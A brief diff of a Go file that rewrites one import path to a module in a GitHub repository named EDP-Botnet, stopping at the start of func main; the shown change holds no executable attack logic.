@@ -2,7 +2,7 @@ package main
 
 import(
   "fmt"
-  "executingslave/ExecutingSlave"
+  "github.com/grisufrj/EDP-Botnet/ExecutingSlave"
 )
 
 func main(){
